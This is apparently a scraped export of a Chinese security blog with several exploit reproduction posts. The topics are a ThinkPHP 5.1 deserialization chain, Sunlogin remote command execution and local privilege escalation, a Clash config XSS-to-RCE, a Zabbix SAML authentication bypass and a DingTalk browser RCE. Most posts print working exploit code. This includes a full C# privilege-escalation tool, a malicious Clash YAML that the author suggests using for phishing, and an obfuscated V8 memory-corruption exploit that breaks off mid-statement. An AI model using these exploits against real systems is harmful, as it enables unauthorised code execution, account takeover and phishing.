如果提供了可选参数 arg，将被作为第三个参数传递给 callback。 所以这里执行filterValue函数，filterValue.value的值为第一个通过GET请求的值，而filters.key为GET请求的键，并且filters.filters就等于input.filters的值。 现在就可以来构造POC了 &lt;?php namespace think\\process\\pipes; use think\\model\\Pivot; class Windows{ private $files = []; public function __construct(){ $this-&gt;files=[new Pivot()]; } } namespace think; abstract class Model{ protected $append=[]; private $data=[]; public function __construct(){ $this-&gt;append=[&quot;lyy9&quot;=&gt;['hello']]; $this-&gt;data=[&quot;lyy9&quot;=&gt;new Request()]; } } namespace think; class Request{ protected $hook = []; protected $filter; protected $config; public function __construct() { $this-&gt;hook['visible'] = [$this, 'isAjax']; $this-&gt;filter = &quot;system&quot;; } } namespace think\\model; use think\\Model; class Pivot extends Model{ } use think\\process\\pipes\\Windows; echo urlencode(serialize(new Windows())); 访问:注意一定要使用pathinfo路由形式（系统默认） 路由形式：http://网址/入口文件/模块名（分组名）/控制器名/方法/参数名/参数值 http://localhost/tp5.1/public/index.php/index/index/unser?lyy9=dir 总结 最后反序列化链 \\thinkphp\\library\\think\\process\\pipes\\Windows.php - &gt; __destruct() \\thinkphp\\library\\think\\process\\pipes\\Windows.php - &gt; removeFiles() Windows.php: file_exists() thinkphp\\library\\think\\model\\concern\\Conversion.php - &gt; __toString() thinkphp\\library\\think\\model\\concern\\Conversion.php - &gt; toJson() thinkphp\\library\\think\\model\\concern\\Conversion.php - &gt; toArray() thinkphp\\library\\think\\Request.php - &gt; __call() thinkphp\\library\\think\\Request.php - &gt; isAjax() thinkphp\\library\\think\\Request.php - &gt; param() thinkphp\\library\\think\\Request.php - &gt; input() thinkphp\\library\\think\\Request.php - &gt; filterValue() 利用条件 有一个内容完全可控的反序列化点，例如： unserialize(可控变量) 存在文件上传、文件名完全可控、使用了文件操作函数，例如： file_exists('phar://恶意文件') 关键点 通过 file_exists 函数将参数当做字符串执行从而触发类的 __toString 方法。 还有就是不存在可利用的visible函数时转向__call方法 ","link":"https://liangyueliangyue.github.io/post/thinkphp51x-fan-xu-lie-hua-lou-dong-fu-xian-yu-fen-xi/"},{"title":"向日葵RCE后续利用之本地提权","content":"根据玄武实验室的文章 https://github.com/Ryze-T/CNVD-2022-10270-LPE 找到目标日志文件 cd /d c:/ dir /S sunlogin_service* 向日葵日志文件 sunlogin_service.20220226-171345.log 复现 安装.NET 4 https://www.microsoft.com/zh-cn/download/details.aspx?id=17718 在运行，发现需要指定路径路径，而我在win7下目录为 C:\\ProgramData\\Oray\\SunloginClient\\log 和默认不同所以需要自己指定（注意这里不带log） sunloginLPE.exe whoami C:\\ProgramData\\Oray\\SunloginClient 代码分析 using System; using System.Collections.Generic; using System.IO; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Text.RegularExpressions; using System.Net; namespace sunloginLPE { internal class Program { static string GetLatestFiles(string Path, int count) { var query = (from f in Directory.GetFiles(Path) let fi = new FileInfo(f) orderby fi.CreationTime descending select fi.FullName).Take(count); string[] files = query.ToArray(); for (int i = 0; i &lt; files.Length; i++) { if (files[i].Contains(&quot;sunlogin_service.&quot;)) { return files[i]; } } Console.WriteLine(&quot;[-] logFile not found&quot;); return &quot;&quot;; } static string getPort(string path) { string logFile = GetLatestFiles(path + &quot;\\\\log&quot;, 2); string port = &quot;&quot;; string s; if (logFile != &quot;&quot;) { FileStream fs = new FileStream(logFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite); StreamReader sr = new StreamReader(fs, System.Text.Encoding.Default); s = sr.ReadToEnd(); string pattern = @&quot;\\bstart listen OK\\S*\\,&quot;; string pattern2 = @&quot;\\d{5}&quot;; string res = &quot;&quot;; MatchCollection mc = Regex.Matches(s, pattern); foreach (Match m in mc) res = m.Value; MatchCollection mc2 = Regex.Matches(res, pattern2); foreach (Match m2 in mc2) port = m2.Value; } return port; } private static String HttpGet(string url, string requestData) { // 实例化请求对象 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + &quot;?&quot; + requestData); request.Method = &quot;GET&quot;; request.ContentType = &quot;text/html; charset=UTF-8&quot;; // 实例化响应对象，获取响应信息 HttpWebResponse response = (HttpWebResponse)request.GetResponse(); Stream responseStream = response.GetResponseStream(); StreamReader sReader = new StreamReader(responseStream, Encoding.Default); String result = sReader.ReadToEnd(); sReader.Close(); responseStream.Close(); return result; } private static String HttpGetWithCookie(string url, string requestData,string cookie) { // 实例化请求对象 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + &quot;?&quot; + requestData); request.Method = &quot;GET&quot;; request.ContentType = &quot;text/html; charset=UTF-8&quot;; request.Headers.Add(&quot;Cookie&quot;, &quot;CID=&quot; + cookie); // 实例化响应对象，获取响应信息 HttpWebResponse response = (HttpWebResponse)request.GetResponse(); Stream responseStream = response.GetResponseStream(); StreamReader sReader = new StreamReader(responseStream, Encoding.Default); String result = sReader.ReadToEnd(); sReader.Close(); responseStream.Close(); return result; } static string exp(string SunloginClient_port,string ExecCmd) { String targetUrl = &quot;http://127.0.0.1:&quot; + SunloginClient_port + &quot;/cgi-bin/rpc&quot;; String response = HttpGet(targetUrl, &quot;action=verify-haras&quot;); string pattern = &quot;verify_string\\&quot;:\\&quot;(\\\\w+)?\\&quot;&quot;; string cid = &quot;&quot;; MatchCollection mc = Regex.Matches(response, pattern); foreach (Match m in mc) cid = m.Value; cid = cid.Replace(&quot;\\&quot;&quot;, &quot;&quot;).Replace(&quot;verify_string:&quot;, &quot;&quot;); Console.WriteLine(&quot;[+] CID=&quot; +cid); targetUrl = &quot;http://127.0.0.1:&quot; + SunloginClient_port + &quot;/check&quot;; response = HttpGetWithCookie(targetUrl, &quot;cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows\\\\system32\\\\cmd.exe+/c+&quot; + ExecCmd.Replace(&quot; &quot;,&quot;+&quot;),cid); return response; } static void Main(string[] args) { Console.WriteLine(&quot;[!] Usage: sunloginLPE.exe Cmd [sunloginClientPath]（DefaultPath = C:\\\\Program Files\\\\Oray\\\\SunLogin\\\\SunloginClient）&quot;); string defaultPath = &quot;C:\\\\Program Files\\\\Oray\\\\SunLogin\\\\SunloginClient&quot;; string cmd = &quot;&quot;; string path = defaultPath; string port = &quot;&quot;; if(args.Length == 1) { cmd = args[0]; } else if(args.Length == 2) { cmd=args[0]; path =args[1]; } else { Console.WriteLine(&quot;[-] wrong number of parameters&quot;); System.Environment.Exit(0); } try { port = getPort(path); if(port != &quot;&quot;) { Console.WriteLine(&quot;[+] SunloginClient port is &quot; + port); } else { Console.WriteLine(&quot;[-] SunloginClient port not found&quot;); System.Environment.Exit(0); } Console.WriteLine(&quot;[+] 命令执行结果: \\n&quot; + exp(port, cmd)); } catch(Exception ex) { Console.WriteLine(&quot;[-] &quot; + ex.ToString()); } } } } 在111行Main函数中写死了路径，如果出现目录不同需要提供第二个参数 string defaultPath = &quot;C:\\\\Program Files\\\\Oray\\\\SunLogin\\\\SunloginClient&quot;; 所以程序其实只自动化了漏洞利用这一块，目录如果不是默认还是需要自己查询 猜测应该是因为直接去自动化查找文件可能会被杀毒拦截，需要进行免杀所以通用性不高就没写 go程序编写 所以自己用go写一个直接一条龙服务（但是不免杀！） 首先确定程序功能 查找进程查看是否存在向日葵进程（这里不确认进程名是否都一致） 寻找日志文件从中提取出端口信息 通过端口信息进行本地利用命令执行达到提权 确认传参 要执行的cmd命令 最后效果 总的来说 首先先通过获取进程列表来确定本地是否存在向日葵进程 如果存在就通过批处理寻找日志文件（自动化） 然后第二步获取最新日志文件 上面的程序直接调用 Directory.GetFiles方法通过创建时间来获取 而我是基于上一步的日志文件通过比对得出的结果 后续的凭证获取和命令执行还是一样 代码也放在了github，对于GO来说还是初学者，所以可能写的不是很好（尤其异常处理这一块还需要完善） https://github.com/liangyueliangyue/sunlogin_rce 后记 因为是基于文件读取的前提进行命令执行，然后向日葵运行是在系统管理员权限，所以可以用来进行本地提权 ","link":"https://liangyueliangyue.github.io/post/xiang-ri-kui-rce-hou-xu-li-yong-zhi-ben-di-ti-quan/"},{"title":"clash代理工具-RCE","content":"clash RCE 影响范围 Windows v0.19.9版本及以下 MAC OS版本未知 poc port: 7890 socks-port: 7891 allow-lan: true mode: Rule log-level: info external-controller: :9090 proxies: - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; type: socks5 server: 127.0.0.1 port: &quot;17938&quot; skip-cert-verify: true - name: abc type: socks5 server: 127.0.0.1 port: &quot;8088&quot; skip-cert-verify: true proxy-groups: - name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; type: select proxies: - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; 复现流程 download订阅 import订阅 将POC放入文件中如txt或者yaml然后import导入 此时再点击proxies即可触发poc弹出计算机 利用 可以将poc伪装成代理配置文件进行钓鱼，水坑攻击 因为clash不会自动更新攻击面还是挺广，去白嫖别人的配置文件时记得看清楚！ 原理 clash 使用了Electron框架，且nodeIntegration值为True，说明开启了Node.js扩展,于是我们可以调用node.js模块从XSS到RCE 只要不进行严格的过滤，就会造成rce require(‘child_process’).exec('') 形如这样的漏洞已经出现很多如 蚁剑 xmind 2020等等 所以还是谨慎开启nodeIntegration参数，如果开启一定要对用户可控输入点做好充分的过滤 如特殊字符实体编码等 ","link":"https://liangyueliangyue.github.io/post/clash-dai-li-gong-ju-rce/"},{"title":"Zabbix-CVE-2022-23131复现","content":"Zabbix-CVE-2022-23131 0x01漏洞介绍 Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 攻击条件限制： 需要启用 SAML 身份验证，并且攻击者必须知道 Zabbix 用户的用户名（或使用默认禁用的访客帐户）。 但因Zabbix的Web前端自动配置了一个名为Admin的高权限用户，所以漏洞利用相对而言难度降低了。 影响版本： 5.4.0 - 5.4.8 6.0.0 - 6.0.0beta1 0x02漏洞复测 利用poc获取session，然后将cookie替换为获取到的session，之后点击Sign in with Single Sign-On (SAML)，即可实现未授权访问。 https://github.com/L0ading-x/cve-2022-23131 获取session 替换zbx_session 点击登录，成功未授权进入后台 0x03POC分析 import requests import re import urllib.parse import base64 import json import sys def exp(target, username): resp = requests.get(url=target, verify=False) cookie = resp.headers.get(&quot;Set-Cookie&quot;) zbx_session = re.findall(r&quot;zbx_session=(.*?); &quot;, cookie) url_decode_data = urllib.parse.unquote(zbx_session[0], encoding='utf-8') base64_decode_data = base64.b64decode(url_decode_data) decode_to_str = str(base64_decode_data, encoding='utf-8') to_json = json.loads(decode_to_str) tmp_ojb = dict(saml_data=dict(username_attribute=username), sessionid=to_json[&quot;sessionid&quot;], sign=to_json[&quot;sign&quot;]) payloadJson = json.dumps(tmp_ojb) print(&quot;decode_payload:&quot;, payloadJson) payload = urllib.parse.quote(base64.b64encode(payloadJson.encode())) print(&quot;zbx_signed_session:&quot;, payload) if __name__ == &quot;__main__&quot;: if len(sys.argv) != 3: print(&quot;argv error&quot;) exit(0) target = sys.argv[1] username = sys.argv[2] exp(target, username) 非常的简单，首先对目标进行一次请求获取到请求头中的set-cookie 再用正则匹配出zbx_session的值，url解码后再base64解码然后转json 手动解码或者直接print打印即可知道json格式 decode_payload: {&quot;saml_data&quot;: {&quot;username_attribute&quot;: &quot;Admin&quot;}, &quot;sessionid&quot;: &quot;c7605481cdd0aaaa1e5c65b91851b55c&quot;, &quot;sign&quot;: &quot;SiSFwbllzSuv+CBeHiQ5fpswmR1KOpAMreltIYVJqlrGxAWOS2Vt6bgeHhz5NpoX+byr17K13wvJV21a0KpBpA==&quot;} 在去构造saml的json请求，只替换了saml_data中的username_attribute参数为存在的用户名(这里是Admin) 然后重新json转码之后base64加密再url编码重新得到payload 后记 安装环境太过繁琐，所以没有审计复现。 简单看了下，是由于检查函数只验证了sessionid，而启用 SAML 身份验证时直接提取了saml_data中的username_attribute来提取用户信息进行登录然后赋值给session 无关于sessionid，而saml_data又没有进行加密等处理，所以导致了身份认证的绕过 ","link":"https://liangyueliangyue.github.io/post/zabbix-cve-2022-23131-fu-xian/"},{"title":"向日葵远控rce复现","content":"向日葵 POC ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fwhoami 端口扫描 首先扫描端口 获取sid 可以通过已知向日葵端口 + cgi-bin/rpc?action=verify-haras的拼接来获取CID的值。 此时的url： http://192.168.159.151:49197/cgi-bin/rpc?action=verify-haras 每次访问不一样，但是都可以用 dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3 远程命令执行 /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami /check?cmd=ping../../../SysWOW64/cmd.exe+/c+whoami Cookie: CID=6onb943qKJoXQGAmr1BKArugFlO9949g 后记 利用的是未授权获取session+命令拼接导致的远程命令执行 ","link":"https://liangyueliangyue.github.io/post/xiang-ri-kui-yuan-kong-rce-fu-xian/"},{"title":"dingtalk-RCE复现","content":"dingtalk-RCE 漏洞版本：6.3.5 触发方式： dingtalk://dingtalkclient/page/link?url=127.0.0.1/test.html&amp;pc_slide=true html，改shellcode变量即可 &lt;html&gt; &lt;body&gt; &lt;h1&gt; test &lt;/h1&gt; &lt;script&gt; var _0x1b17=['KELCi8OxLg==','ZE/CpWvCpDkcPA==','E8Kjw51bQ8O+Klk0w4vCsw==','w5lnw5Ipwr12RsOCw7B/J8OEw4E=','QMOtNcO9w77Dv8OIwp3DmQ7CksOdOA==','X8KgbcK0wqXCuw==','DjfCg8KK','OsO3fsOwwojCq0YpMw==','RMKWBMKHW3PCqcKjTwgMaw==','O8KCw5PCoMOpwo0=','e0rDgMO8wqNndsOM','wphVw6Zhw7wWwrLDg8K1','IibCvsKFwqXCqMKAw6w4NDgs','PcO6Z8O2w4LCp20tMWrDhxMZRSLCmSvDuTjCnk8=','GcOiPsKX','G8K7w6vDpXNGIcOwLnXDu8K9BkI=','w7MXFMKhw78WwpYqwqVVFcKR','GMK/w7vDpnVIJ8Or','ank7Wy4jw44=','HTfCicKbGsKEaysJwqTDux1L','GS3CqsKEwqjCp8KRw5Y=','GcOmcktVwrw=','w50aKsKuwq9cdMO4wpTDqyo5GBQ=','IybCrcKgwrvCpsKGw5w8Pyc5AcOn','NhbCuwM=','wqFcbEfDmMOMw6LCkl9ywqwDwocc','wqfChMOfw4jDjsKzwozCn8Oqwok=','w4tcwrED','cCvCsMOQw7g=','w6pdw4k=','wqJyw4vCmMO1wrTCj8OSwqnDnSY=','WsKcBA==','wrV8w4vCjcOlwrDDgcKXwqTDlQ==','XsKWD8KeWA==','H8O+KcKHHGPDiUQ=','w73Ci8OFw60=','Wy7Csg==','e0TDocOvwrR6IsKLQArDsw==','AzvCjQIS','VMOxw6/Ciw==','fEDDp8OdwrhgbMKYGw==','PCzCvg==','w5QHwrPDlGRLNQHDpHwqa8OJR3hiwpwyMBJzJR8=','ZMO8ecOcd8Oow7M6wq1O','w417wqvDl3BuwooiwrnCpDBZwoNw','fHtRGA==','Y24s','w4VWwrsdKQ8=','HsKCOC4RwrQ=','w4AJwrLDi05SLxfDtEI0esODaA==','L2kiFG0=','H8O+I8KdBmc=','w6RcwrEPMQI=','FTvDq8O+w7Ucax4=','FsKfJS4Rwrky','wpBAw5zCjMO1','HsO+w4PDgsKUWw==','EcKxwoXDjcOLCQ==','PkrCncOEOMOww7fCrlDCgMOJesOdAQ==','F8K+w49bSQ==','w4dew5rDmMKg','wp52wrbCpzM=','wqIjw4xDwqA=','cMKIw5vCncKdJV/CoMK7RA==','CiTCnsKdC8KV','fXtHE8ObSBZqwp5G','Fjd1EMOqw57CgcOd','ZsOje8OLbMO8w4Q3wqAQwqU=','C8Kxw63Dh3RZIcO6Pj4=','w4rDj8O/','ZU/Ctg==','BcKyw55TcsO8HF8+w7jCtsKtEgo7w5LCigQ8','w4ZdwrkVPAM='];(function(_0x4285cf,_0x1b1736){var _0x1368bb=function(_0x5a17b5){while(--_0x5a17b5){_0x4285cf['push'](_0x4285cf['shift']());}};_0x1368bb(++_0x1b1736);}(_0x1b17,0x17b));var _0x1368=function(_0x4285cf,_0x1b1736){_0x4285cf=_0x4285cf-0x0;var _0x1368bb=_0x1b17[_0x4285cf];if(_0x1368['kUYGYC']===undefined){(function(){var _0x270725=function(){var _0x2929b1;try{_0x2929b1=Function('return\\x20(function()\\x20'+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');')();}catch(_0x1b9f87){_0x2929b1=window;}return _0x2929b1;};var _0x1971fd=_0x270725();var _0x3ad59d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1971fd['atob']||(_0x1971fd['atob']=function(_0x332690){var _0x352a1c=String(_0x332690)['replace'](/=+$/,'');var _0x194774='';for(var _0x5d479b=0x0,_0xde7a28,_0x1ef172,_0x26c98e=0x0;_0x1ef172=_0x352a1c['charAt'](_0x26c98e++);~_0x1ef172&amp;&amp;(_0xde7a28=_0x5d479b%0x4?_0xde7a28*0x40+_0x1ef172:_0x1ef172,_0x5d479b++%0x4)?_0x194774+=String['fromCharCode'](0xff&amp;_0xde7a28&gt;&gt;(-0x2*_0x5d479b&amp;0x6)):0x0){_0x1ef172=_0x3ad59d['indexOf'](_0x1ef172);}return _0x194774;});}());var _0xa07d5c=function(_0x5c13fe,_0x1ca04c){var _0x48ea63=[],_0x8f6b18=0x0,_0x30c8e4,_0xb17e6='',_0x53b898='';_0x5c13fe=atob(_0x5c13fe);for(var _0x52b8af=0x0,_0x1cd1ff=_0x5c13fe['length'];_0x52b8af&lt;_0x1cd1ff;_0x52b8af++){_0x53b898+='%'+('00'+_0x5c13fe['charCodeAt'](_0x52b8af)['toString'](0x10))['slice'](-0x2);}_0x5c13fe=decodeURIComponent(_0x53b898);var _0x49825d;for(_0x49825d=0x0;_0x49825d&lt;0x100;_0x49825d++){_0x48ea63[_0x49825d]=_0x49825d;}for(_0x49825d=0x0;_0x49825d&lt;0x100;_0x49825d++){_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d]+_0x1ca04c['charCodeAt'](_0x49825d%_0x1ca04c['length']))%0x100;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;}_0x49825d=0x0;_0x8f6b18=0x0;for(var _0x17f739=0x0;_0x17f739&lt;_0x5c13fe['length'];_0x17f739++){_0x49825d=(_0x49825d+0x1)%0x100;_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d])%0x100;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;_0xb17e6+=String['fromCharCode'](_0x5c13fe['charCodeAt'](_0x17f739)^_0x48ea63[(_0x48ea63[_0x49825d]+_0x48ea63[_0x8f6b18])%0x100]);}return _0xb17e6;};_0x1368['SGqjCq']=_0xa07d5c;_0x1368['PalevQ']={};_0x1368['kUYGYC']=!![];}var _0x5a17b5=_0x1368['PalevQ'][_0x4285cf];if(_0x5a17b5===undefined){if(_0x1368['FXcKZO']===undefined){_0x1368['FXcKZO']=!![];}_0x1368bb=_0x1368['SGqjCq'](_0x1368bb,_0x1b1736);_0x1368['PalevQ'][_0x4285cf]=_0x1368bb;}else{_0x1368bb=_0x5a17b5;}return _0x1368bb;};const max_size=0x2710;const buf=new ArrayBuffer(0x8);const f64=new Float64Array(buf);const u32=new Uint32Array(buf);function f2i(_0x5ba462){f64[0x0]=_0x5ba462;let _0x3b54a5=Array['from'](u32);return _0x3b54a5[0x1]*0x100000000+_0x3b54a5[0x0];}function i2f(_0x2f58b4){let _0x8b3c4c=[];_0x8b3c4c[0x0]=parseInt(_0x2f58b4%0x100000000);_0x8b3c4c[0x1]=parseInt((_0x2f58b4-_0x8b3c4c[0x0])/0x100000000);u32[_0x1368('0x38','XQdw')](_0x8b3c4c);return f64[0x0];}function d2u(_0x9ff56e){f64[0x0]=_0x9ff56e;let _0x47fd50=Array[_0x1368('0xa','7rtu')](u32);return _0x47fd50;}function u2d(_0x535342,_0x2feac9){u32[0x0]=_0x535342;u32[0x1]=_0x2feac9;return f64[0x0];}function print(_0x510c7e){document[_0x1368('0x29','1027')](_0x1368('0x16','pndm')+_0x510c7e+_0x1368('0x19','@XkD'));}function hex(_0x2abe47){return _0x2abe47[_0x1368('0x45','Ob1V')](0x10)[_0x1368('0x3','@XkD')](0x10,'0');}function success_value(_0x140a70,_0x2c5308){console[_0x1368('0x11','THAJ')](_0x1368('0x15','ki5k')+_0x140a70+hex(_0x2c5308));}function wasm_func(){var _0x1ab208={'env':{'puts':function _0x36676a(_0x4b8a69){console[_0x1368('0x1b','*I%3')](_0x4b8a69);}}};var _0x364582=new Uint8Array([0x0,0x61,0x73,0x6d,0x1,0x0,0x0,0x0,0x1,0x89,0x80,0x80,0x80,0x0,0x2,0x60,0x1,0x7f,0x1,0x7f,0x60,0x0,0x0,0x2,0x8c,0x80,0x80,0x80,0x0,0x1,0x3,0x65,0x6e,0x76,0x4,0x70,0x75,0x74,0x73,0x0,0x0,0x3,0x82,0x80,0x80,0x80,0x0,0x1,0x1,0x4,0x84,0x80,0x80,0x80,0x0,0x1,0x70,0x0,0x0,0x5,0x83,0x80,0x80,0x80,0x0,0x1,0x0,0x1,0x6,0x81,0x80,0x80,0x80,0x0,0x0,0x7,0x92,0x80,0x80,0x80,0x0,0x2,0x6,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x2,0x0,0x5,0x68,0x65,0x6c,0x6c,0x6f,0x0,0x1,0xa,0x8d,0x80,0x80,0x80,0x0,0x1,0x87,0x80,0x80,0x80,0x0,0x0,0x41,0x10,0x10,0x0,0x1a,0xb,0xb,0x92,0x80,0x80,0x80,0x0,0x1,0x0,0x41,0x10,0xb,0xc,0x48,0x65,0x6c,0x6c,0x6f,0x20,0x57,0x6f,0x72,0x6c,0x64,0x0]);let _0x17d97a=new WebAssembly[(_0x1368('0x6','*I%3'))](new WebAssembly[(_0x1368('0x26','h0rH'))](_0x364582),_0x1ab208);let _0x4137b4=new Uint8Array(_0x17d97a[_0x1368('0x28','U7m4')][_0x1368('0x22','U7m4')][_0x1368('0x2a','CQJJ')]);return _0x17d97a[_0x1368('0x4','qxzt')][_0x1368('0x13','THAJ')];}func=wasm_func();function gc(){for(let _0x636073=0x0;_0x636073&lt;0x10;_0x636073++){new Array(0x1000000);}}function debug(){for(let _0x1aae5c=0x0;_0x1aae5c&lt;0x10000;_0x1aae5c++){for(let _0x206767=0x0;_0x206767&lt;0x20000;_0x206767++){var _0x4e0be5=_0x4e0be5+_0x1aae5c+_0x206767;}}}global_object={};setPropertyViaEmbed=(_0x704953,_0xabb024,_0x54136d)=&gt;{const _0x57fb88=document[_0x1368('0x5','qlp^')](_0x1368('0x3b','e8CW'));_0x57fb88[_0x1368('0x3a','h0rH')]=_0x54136d;_0x57fb88['type']=_0x1368('0x46','E5A6');Object['setPrototypeOf'](global_object,_0x57fb88);document[_0x1368('0x1f','4nv[')][_0x1368('0x35','ow9l')](_0x57fb88);_0x704953[_0x1368('0x23','p]KF')]=_0xabb024;_0x57fb88[_0x1368('0x25','QvKY')]();};createCorruptedPair=(_0x16735d,_0x65366a)=&gt;{const _0x5a7565={'__proto__':global_object};_0x5a7565[_0x1368('0x47','*I%3')]=0x1;setPropertyViaEmbed(_0x5a7565,_0x65366a,()=&gt;{Object[_0x1368('0x2c','e8CW')](global_object,null);_0x5a7565[_0x1368('0x8','Ub)S')]=_0x16735d;});const _0x2dc8d4={'__proto__':global_object};_0x2dc8d4[_0x1368('0x43','THAJ')]=0x1;setPropertyViaEmbed(_0x2dc8d4,_0x65366a,()=&gt;{Object[_0x1368('0x1','@XkD')](global_object,null);_0x2dc8d4[_0x1368('0xb','*j!$')]=_0x16735d;_0x5a7565[_0x1368('0x2','5I39')]=1.1;});return[_0x5a7565,_0x2dc8d4];};const array=[5.5,1.1];array['prop']=0x1;const test1=new BigUint64Array(0x2);var oob_array=[1.1,2.2,3.3];obj_array={'m':0x539,'target':gc};ab=new ArrayBuffer(0x1337);gc();gc();gc();var test=[oob_array,oob_array,oob_array,oob_array,oob_array];test[_0x1368('0x41','qlp^')]=0x1;const [object_1,object_2]=createCorruptedPair(array,test);jit=(_0x166e60,_0x539576,_0x1ae253)=&gt;{return _0x166e60['corrupted_prop'][_0x539576];};for(var i=0x0;i&lt;0x10000;++i)jit(object_1,0x0);var leak=jit(object_2,0x0);elem=d2u(leak)[0x0];print('0x'+hex(elem));const num=u2d(elem+0x4,elem+0x4);const num2=u2d(elem,elem);proto2={};setPropertyViaEmbed2=(_0x3c4ce8,_0x5b3f78,_0x570b6e)=&gt;{const _0x1411bc=document[_0x1368('0x3e','NbDf')](_0x1368('0x2d','54b8'));_0x1411bc[_0x1368('0x44','MqJl')]=_0x570b6e;_0x1411bc[_0x1368('0x0','QvKY')]=_0x1368('0x42','Xp#V');Object[_0x1368('0x1e','djTM')](proto2,_0x1411bc);document[_0x1368('0xd','h0rH')][_0x1368('0x3d','54b8')](_0x1411bc);_0x3c4ce8[_0x1368('0x33','4nv[')]=_0x5b3f78;_0x1411bc['remove']();};createCorruptedPair2=(_0x31208b,_0x4b08b5)=&gt;{const _0x2fdefd={'__proto__':proto2};_0x2fdefd[_0x1368('0x27','pndm')]=0x1;setPropertyViaEmbed2(_0x2fdefd,_0x4b08b5,()=&gt;{Object['setPrototypeOf'](proto2,null);_0x2fdefd[_0x1368('0x36','@XkD')]=_0x31208b;});const _0x5a6d27={'__proto__':proto2};_0x5a6d27[_0x1368('0x3c','XQdw')]=0x1;setPropertyViaEmbed2(_0x5a6d27,_0x4b08b5,()=&gt;{Object[_0x1368('0x9','*I%3')](proto2,null);_0x5a6d27[_0x1368('0xc','eHuP')]=_0x31208b;_0x2fdefd[_0x1368('0x14','QvKY')]=1.1;});return[_0x2fdefd,_0x5a6d27];};const [object_3,object_4]=createCorruptedPair2(array,num2);jit22=(_0x15b278,_0x32c377)=&gt;{_0x15b278[_0x1368('0x31','*clI')][_0x32c377]=num2;_0x15b278[_0x1368('0x12','1#r2')][_0x32c377+0x1]=1.1;return _0x15b278[_0x1368('0x1d','ow9l')][_0x32c377];};for(var i=0x0;i&lt;0x100000;++i)jit22(object_3,0x0);var leak2=jit22(object_4,0x0);var object_idx=undefined;var object_idx_flag=undefined;for(let i=0x0;i&lt;max_size;i++){if(d2u(oob_array[i])[0x0]==0xa72){print(_0x1368('0x2b','CQJJ')+i+_0x1368('0x18','O6t]'));print('target:\\x20i:\\x20'+i+'\\x20hi\\x201');object_idx=i;object_idx_flag=0x1;break;}if(d2u(oob_array[i])[0x1]==0xa72){print(_0x1368('0x7','3nrn')+i+_0x1368('0x2f','djTM'));print('target:\\x20i:\\x20'+(i+0x1)+_0x1368('0x18','O6t]'));object_idx=i+0x1;object_idx_flag=0x0;break;}}function addrof(_0x71fee0){obj_array[_0x1368('0x32','qlp^')]=_0x71fee0;return d2u(oob_array[object_idx])[object_idx_flag]-0x1;}var ab_addr=addrof(ab);print('test:\\x20'+hex(ab_addr));var bk_idx=undefined;var bk_idx_flag=undefined;let flag=0x0;for(let i=0x0;i&lt;max_size;i++){if(d2u(oob_array[i])[0x0]==0x1337){console[_0x1368('0x20','qxzt')](_0x1368('0x40','M*(X')+i+_0x1368('0x2e','1027'));console[_0x1368('0x37','ki5k')](_0x1368('0x17','Ob1V')+i+_0x1368('0xe','*I%3'));bk_idx=i;bk_idx_flag=0x1;break;}if(d2u(oob_array[i])[0x1]==0x1337){console['log']('m:\\x20i:\\x20'+i+_0x1368('0x24','qxzt'));console[_0x1368('0xf','0$K8')](_0x1368('0x10','1#r2')+(i+0x1)+_0x1368('0x30','roPh'));bk_idx=i+0x1;bk_idx_flag=0x0;break;}}var dv=new DataView(ab);var bk_addr=d2u(oob_array[bk_idx]);function get_32(_0x251c0e){var _0x524bc3=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0){oob_array[bk_idx]=u2d(_0x251c0e,_0x524bc3[0x1]);}else{oob_array[bk_idx]=u2d(_0x524bc3[0x0],_0x251c0e);}return dv['getUint32'](0x0,!![]);}function set_32(_0x2f8305,_0x1a3c26){var _0xd022f7=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0){oob_array[bk_idx]=u2d(_0x2f8305,_0xd022f7[0x1]);}else{oob_array[bk_idx]=u2d(_0xd022f7[0x0],_0x2f8305);}dv[_0x1368('0x1a','Ob1V')](0x0,_0x1a3c26,!![]);}function set_8(_0x5d0cd7,_0x575a5c){var _0x50493b=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0){oob_array[bk_idx]=u2d(_0x5d0cd7,_0x50493b[0x1]);}else{oob_array[bk_idx]=u2d(_0x50493b[0x0],_0x5d0cd7);}dv[_0x1368('0x34','tZnn')](0x0,_0x575a5c,!![]);}var wasm_func_addr=addrof(func);print(_0x1368('0x39','54b8')+hex(wasm_func_addr));var shared_info_addr=get_32(wasm_func_addr+0xc)-0x1;print(_0x1368('0x48','Xp#V')+hex(shared_info_addr));var export_function_data_addr=get_32(shared_info_addr+0x4)-0x1;print('export_function_data_addr\\x20is:\\x20'+hex(export_function_data_addr));var 